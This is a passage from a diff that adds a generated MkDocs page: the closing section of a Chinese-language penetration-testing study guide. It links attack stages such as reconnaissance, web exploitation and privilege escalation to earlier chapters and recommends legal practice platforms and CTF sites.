+<td>TryHackMe: Complete Beginner</td>
+<td style="text-align: center;">⭐</td>
+<td>浏览器做实验，不需要装环境</td>
+</tr>
+<tr>
+<td>DVWA / Pikachu</td>
+<td style="text-align: center;">⭐</td>
+<td>Web 漏洞专项训练</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="_11">🔗 知识串联（全部！）<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>信息收集→端口扫描     《04-网络协议》TCP/UDP/端口概念
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>Web 漏洞利用          《06-Web安全》全部漏洞类型
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>二进制漏洞利用        《07-二进制安全》全部攻击手法
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>密码破解              《05-密码学》哈希原理 + hashcat
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>反弹 shell 中的网络   《04-网络协议》TCP 连接（socket）
+<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>提权中的 SUID/权限     《03-计算机体系》Linux 权限模型
+<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>逆向特殊二进制        《03-计算机体系》汇编知识
+<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>所有自动化脚本         《02-Python》+《01-C语言》
+</code></pre></div>
+<hr />
+<blockquote>
+<p>💬 <strong>读完用一句话记下来：</strong> "渗透测试不是对着目标一通乱打，而是一个系统性工程——信息收集决定你能走多远，漏洞利用决定你能走多深，提权决定你能不能赢。每一步都需要前面所有章节的知识支撑。想赢？先把地基打牢。"</p>
+</blockquote>
+<h3 id="_12">🏁 全知识库学完！恭喜！<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<p><strong>下一步做什么：</strong>
+1. 回到 <code>00-目录与进度.md</code> 查漏补缺——把没打勾的知识点补上
+2. 去 VulnHub/HackTheBox 打更多靶机——每个靶机都是一次完整的实战练习
+3. 去 BUUCTF 做 CTF 题目——把各章节知识综合运用
+4. 把你学到的东西教给别人——能讲清楚才是真正学会了</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.top", "navigation.indexes", "search.suggest", "search.highlight", "search.share", "content.code.copy"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
